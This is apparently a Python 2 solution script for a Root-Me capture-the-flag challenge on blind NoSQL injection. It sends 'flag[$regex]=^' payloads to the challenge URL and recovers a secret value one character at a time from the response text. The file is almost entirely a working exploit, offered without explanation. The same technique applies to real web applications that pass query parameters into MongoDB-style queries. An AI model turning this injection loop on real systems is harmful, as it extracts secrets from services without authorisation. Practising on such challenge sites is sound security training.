import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import string
def requests_retry_session(
    retries=10,
    backoff_factor=0.3,
    status_forcelist=(500, 502, 504),
    session=None
    ):
    session = session or requests.Session()
    retry = Retry(
    total=retries,
    read=retries,
    connect=retries,
    backoff_factor=backoff_factor,
    status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session
 
url="http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]="
char=string.letters+string.digits+"_!@$&"
flag=""
for x in range(1,33):
    for i in char:
        print url+"^"+flag+i
        r=requests_retry_session().get(url+"^"+flag+i)
        print r.content
        if "Yeah" in r.content:
            flag=flag+i
            break
        print '###########################################'
    print flag
